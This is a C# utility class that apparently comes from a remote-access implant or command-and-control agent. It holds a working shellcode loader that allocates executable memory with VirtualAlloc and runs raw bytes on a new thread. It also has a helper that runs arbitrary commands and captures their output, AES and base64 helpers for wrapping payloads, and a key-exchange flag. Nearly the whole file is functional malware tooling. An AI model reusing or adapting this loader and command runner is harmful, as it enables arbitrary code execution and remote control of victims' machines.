using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

internal class Utils {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();
    
    private static bool hasExchangeKey = false;
    private static string charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890,./<>?;':`~!@#$%^&*()-=_+";

    /// <summary>
    /// Execute the shellcode in thread
    /// </summary>
    /// <param name="shellcode">Raw shellcode content</param>
    public static void ExecuteShellCode(byte[] shellcode) {
        // get pointer of allocated buffer
        IntPtr ptr = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(shellcode.Length), 0x1000, 0x40);
        Marshal.Copy(shellcode, 0x0, ptr, shellcode.Length);
        WindowRun r = Marshal.GetDelegateForFunctionPointer<WindowRun>(ptr);

        ThreadStart s = new(r);
        new Thread(s).Start();
    }

    /// <summary>
    /// Read the binary file and return bytes
    /// </summary>
    /// <param name="path">Absolute path of the file to read</param>
    /// <returns>Raw content of binary file</returns>
    public static byte[] ReadBinaryFile(string path) {
        // get file stream
        using(var file = File.OpenRead(path)) {

            // get binary stream from file
            using(var bReader = new BinaryReader(file)) {
                using (var ms = new MemoryStream()) {
                    // read into memory until all bytes are read from file and cursor reached EOF
                    while (true) {
                        byte[] buf = bReader.ReadBytes(1024);
                        if (buf.Length == 0) {
                            break;
                        } else {
                            ms.Write(buf);
                        }
                    }
                    return ms.ToArray();
                }
            }
        }
    }

    /// <summary>
    /// Execute command with args and return output
    /// </summary>
    /// <param name="fileName">File name in %PATH% environment variable</param>
    /// <param name="args">Arguments for the file</param>
    /// <returns>Output of the command</returns>
    public static string ExecuteCommand(string fileName, string[] args) {
        string output = string.Empty;

        // Copy raw content in memory
        using(var stream = new MemoryStream()) {

            var process = new Process() { StartInfo = new ProcessStartInfo(fileName, string.Join(' ', args)) { UseShellExecute = false, RedirectStandardError = true, RedirectStandardOutput = true } };

            try {
                process.Start();

                process.StandardError.BaseStream.CopyTo(stream);
                process.StandardOutput.BaseStream.CopyTo(stream);

                process.WaitForExit();
            } catch (Exception e) {
                // handle error and pipe to memory stream
                stream.Write(Encoding.ASCII.GetBytes(e.Message + '\n'));
            } finally {
                // convert bytes to string
                output = Encoding.ASCII.GetString(stream.ToArray());
            }
        }

        return output;
    }

    /// <summary>
    /// Perform AES encryption on the string with IV and Key and return raw data
    /// 
    /// https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-5.0
    /// </summary>
    /// <param name="payload">String data to encrypt</param>
    /// <param name="iv">Initializing Vector</param>
    /// <param name="key">Encryption key</param>
    /// <returns>Encrypted raw bytes</returns>
    public static byte[] EncryptData(string payload, string iv, string key) {
        byte[] encrypted;
        
        using(var aes = Aes.Create()) {
            aes.IV = Encoding.ASCII.GetBytes(iv);
            aes.Key = Encoding.ASCII.GetBytes(key);

            var crypt = aes.CreateEncryptor(aes.Key, aes.IV);

            using (var memStream = new MemoryStream()) {
                using(var cStream = new CryptoStream(memStream, crypt, CryptoStreamMode.Write)) {
                    using(var ws = new StreamWriter(cStream)) {
                        ws.Write(payload);
                    }
                    encrypted = memStream.ToArray();
                }
            }
        }

        return encrypted;
    }

    /// <summary>
    /// Perform AES decryption on the bytes with IV and Key and return string data
    /// 
    /// https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-5.0
    /// </summary>
    /// <param name="payload">Payload to decrypt</param>
    /// <param name="iv">Initializing Vector</param>
    /// <param name="key">Encryption key</param>
    /// <returns>Decrypted string</returns>
    public static string DecryptData(byte[] payload, string iv, string key) {
        string decrypted = string.Empty;

        using (var aes = Aes.Create()) {
            aes.IV = Encoding.ASCII.GetBytes(iv);
            aes.Key = Encoding.ASCII.GetBytes(key);

            var crypt = aes.CreateDecryptor(aes.Key, aes.IV);

            using (var memStream = new MemoryStream(payload)) {
                using (var cStream = new CryptoStream(memStream, crypt, CryptoStreamMode.Read)) {
                    using(var rs = new StreamReader(cStream)) {
                        decrypted = rs.ReadToEnd(); 
                    }
                }
            }
        }

        return decrypted;
    }

    /// <summary>
    /// Get a random string from charset of certain length
    /// </summary>
    /// <param name="length">How many characters?</param>
    /// <returns></returns>
    public static string GetRandomString(int length) {
        Random random = new();
        string password = string.Empty;

        for (int i = 0; i < length; i++) {
            int idx = random.Next(0, charSet.Length);
            password += charSet[idx];
        }

        return password;
    }

    /// <summary>
    /// Convert the raw data to base64 string
    /// </summary>
    /// <param name="data"></param>
    /// <returns></returns>
    public static string SerializeBytes(byte[] data) {
        return Convert.ToBase64String(data);
    }

    /// <summary>
    /// Convert the base64 string to underlying raw data
    /// </summary>
    /// <param name="data"></param>
    /// <returns></returns>
    public static byte[] DeserializeData(string data) {
        return Convert.FromBase64String(data);
    }

    public static bool HasExchangedKeys {
        get => hasExchangeKey;
        set => hasExchangeKey = value;
    }
}

